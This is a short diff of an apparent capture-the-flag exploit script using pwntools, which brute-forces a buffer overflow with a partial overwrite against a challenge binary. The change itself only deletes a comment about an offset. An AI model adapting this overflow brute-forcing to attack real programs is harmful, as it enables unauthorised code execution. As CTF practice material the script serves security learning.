@@ -19,7 +19,6 @@ for _ in range(4096):
         payload = b'A'*CYCLIC_NUM + pwn.p8(0x61) + pwn.p8(c)
 
         proc = pwn.process(["/challenge/finalctf_AdvancedOverflow", payload])
-        # 1e offset comes from the instruction right before the second puts call in assembly
 
         tmp = proc.recvall(.25).decode()
 
